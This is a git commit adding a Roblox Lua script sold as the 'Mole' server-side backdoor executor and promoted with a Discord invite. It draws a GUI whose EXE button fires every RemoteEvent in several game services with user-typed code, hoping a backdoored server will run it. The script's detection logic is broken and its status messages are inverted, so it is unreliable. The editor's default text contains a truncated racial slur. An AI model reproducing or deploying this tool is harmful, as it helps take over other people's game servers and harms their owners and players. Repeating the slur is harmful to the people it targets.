30411a2b4e7d08b922d08bd5c383d44009130a51
TheTombstoneBackdoorOwner <mythtester500400@outlook.com>
2025-07-01 18:59:41 +0100

    Create Mole.lua

---
+++ Mole.lua
@@ -0,0 +1,249 @@
+local message = Instance.new("Message", workspace)
+message.Text = "Backdoor made by wanna die? credited by pepsi hub owner: Ghostin138"
+wait(1)
+message:Destroy()
+
+local message = Instance.new("Message", workspace)
+message.Text = "Thanks for using Mole Backdoor ;)"
+wait(1)
+message:Destroy()
+
+local message = Instance.new("Message", workspace)
+message.Text = "Pepsi Hub: https://discord.gg/WWw7U83mpJ"
+wait(1)
+message:Destroy()
+
+-- Instances: 12 | Scripts: 3 | Modules: 0 | Tags: 0
+local G2L = {};
+
+-- StarterGui.ScreenGui
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+-- StarterGui.ScreenGui.Frame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2"]["Size"] = UDim2.new(0, 369, 0, 250);
+G2L["2"]["Position"] = UDim2.new(0.13623, 0, 0.17354, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+
+
+-- StarterGui.ScreenGui.Frame.LocalScript
+G2L["3"] = Instance.new("LocalScript", G2L["2"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.editor
+G2L["4"] = Instance.new("TextBox", G2L["2"]);
+G2L["4"]["Name"] = [[editor]];
+G2L["4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["4"]["BorderSizePixel"] = 3;
+G2L["4"]["TextWrapped"] = true;
+G2L["4"]["TextSize"] = 14;
+G2L["4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4"]["MultiLine"] = true;
+G2L["4"]["ClearTextOnFocus"] = false;
+G2L["4"]["Size"] = UDim2.new(0, 369, 0, 205);
+G2L["4"]["Position"] = UDim2.new(0, 0, 0.17844, 0);
+G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4"]["Text"] = [[nigg]];
+
+
+-- StarterGui.ScreenGui.Frame.TextLabel
+G2L["5"] = Instance.new("TextLabel", G2L["2"]);
+G2L["5"]["BorderSizePixel"] = 3;
+G2L["5"]["TextSize"] = 14;
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Size"] = UDim2.new(0, 369, 0, 44);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Text"] = [[]];
+
+
+-- StarterGui.ScreenGui.Frame.TextLabel
+G2L["6"] = Instance.new("TextLabel", G2L["2"]);
+G2L["6"]["BorderSizePixel"] = 0;
+G2L["6"]["TextSize"] = 14;
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["BackgroundTransparency"] = 1;
+G2L["6"]["Size"] = UDim2.new(0, 150, 0, 56);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["Text"] = [[Mole SS (Backdoor)]];
+G2L["6"]["Position"] = UDim2.new(0.10566, 0, -0.02796, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ImageLabel
+G2L["7"] = Instance.new("ImageLabel", G2L["2"]);
+G2L["7"]["BorderSizePixel"] = 0;
+G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7"]["Image"] = [[rbxassetid://120447388437067]];
+G2L["7"]["Size"] = UDim2.new(0, 29, 0, 27);
+G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7"]["BackgroundTransparency"] = 1;
+G2L["7"]["Position"] = UDim2.new(-0.00262, 0, 0.03324, 0);
+
+
+-- StarterGui.ScreenGui.Frame.TextLabel
+G2L["8"] = Instance.new("TextLabel", G2L["2"]);
+G2L["8"]["BorderSizePixel"] = 3;
+G2L["8"]["TextSize"] = 14;
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8"]["Size"] = UDim2.new(0, 72, 0, 250);
+G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8"]["Text"] = [[]];
+G2L["8"]["Position"] = UDim2.new(0.99955, 0, 0, 0);
+
+
+-- StarterGui.ScreenGui.Frame.EXE
+G2L["9"] = Instance.new("TextButton", G2L["2"]);
+G2L["9"]["BorderSizePixel"] = 0;
+G2L["9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9"]["TextSize"] = 14;
+G2L["9"]["BackgroundColor3"] = Color3.fromRGB(107, 107, 107);
+G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9"]["Size"] = UDim2.new(0, 72, 0, 126);
+G2L["9"]["Name"] = [[EXE]];
+G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9"]["Text"] = [[EXE]];
+G2L["9"]["Position"] = UDim2.new(0.99886, 0, 0.496, 0);
+
+
+-- StarterGui.ScreenGui.Frame.EXE.LocalScript
+G2L["a"] = Instance.new("LocalScript", G2L["9"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.Clear
+G2L["b"] = Instance.new("TextButton", G2L["2"]);
+G2L["b"]["BorderSizePixel"] = 0;
+G2L["b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b"]["TextSize"] = 14;
+G2L["b"]["BackgroundColor3"] = Color3.fromRGB(107, 107, 107);
+G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["b"]["Size"] = UDim2.new(0, 72, 0, 124);
+G2L["b"]["Name"] = [[Clear]];
+G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b"]["Text"] = [[Clear]];
+G2L["b"]["Position"] = UDim2.new(0.99886, 0, 0, 0);
+
+
+-- StarterGui.ScreenGui.Frame.Clear.LocalScript
+G2L["c"] = Instance.new("LocalScript", G2L["b"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.LocalScript
+local function C_3()
+local script = G2L["3"];
+	function dragify(Main)
+		dragToggle = nil
+		dragSpeed = 0.95 -- You can edit this.
+		dragInput = nil
+		dragStart = nil
+		dragPos = nil
+	
+		function updateInput(input)
+			Delta = input.Position - dragStart
+			Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+			game:GetService("TweenService"):Create(Main, TweenInfo.new(.25), {Position = Position}):Play()
+		end
+	
+		Main.InputBegan:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = Main.Position
+				input.Changed:Connect(function()
+					if (input.UserInputState == Enum.UserInputState.End) then
+						dragToggle = false
+					end
+				end)
+			end
+		end)
+	
+		Main.InputChanged:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				dragInput = input
+			end
+		end)
+	
+		game:GetService("UserInputService").InputChanged:Connect(function(input)
+			if (input == dragInput and dragToggle) then
+				updateInput(input)
+			end
+		end)
+	end
+	
+	dragify(script.Parent)
+end;
+task.spawn(C_3);
+-- StarterGui.ScreenGui.Frame.EXE.LocalScript
+local function C_a()
+local script = G2L["a"];
+	local button = script.Parent
+	local editor = script.Parent.Parent.editor
+	local services = {game:GetService("ReplicatedStorage"), game:GetService("Lighting"), game:GetService("Workspace")}
+	
+	
+	local function FireRemote(remote)
+		if remote:IsA("RemoteEvent") then
+			print("Verificando:", remote.Name)
+			remote:FireServer(editor.Text)
+		end
+	end
+	
+	local function findBackdoorRemote()
+		for _, service in ipairs(services) do
+			for _, v in pairs(service:GetDescendants()) do
+				if v:IsA("RemoteEvent") then
+					local backdoor = FireRemote(v)
+					if backdoor then
+						return backdoor
+					end
+				end
+			end
+		end
+		return nil
+	end
+	
+	local backdoorRemote = findBackdoorRemote()
+	
+	if backdoorRemote then
+		warn("No backdoors!")
+		backdoorRemote:FireServer(editor.Text)
+	else
+	
+		local StarterGui = game:GetService("StarterGui") 
+	   print("Backdoor found!")
+	end
+	
+	button.MouseButton1Click:Connect(function()
+		findBackdoorRemote()
+	end)
+	
+end;
+task.spawn(C_a);
+-- StarterGui.ScreenGui.Frame.Clear.LocalScript
+local function C_c()
+local script = G2L["c"];
+	local button = script.Parent
+	local editor = script.Parent.Parent.editor
+	
+	button.MouseButton1Click:Connect(function()
+		editor.Text = ""
+	end)
+	
+end;
+task.spawn(C_c);
+
+return G2L["1"], require;
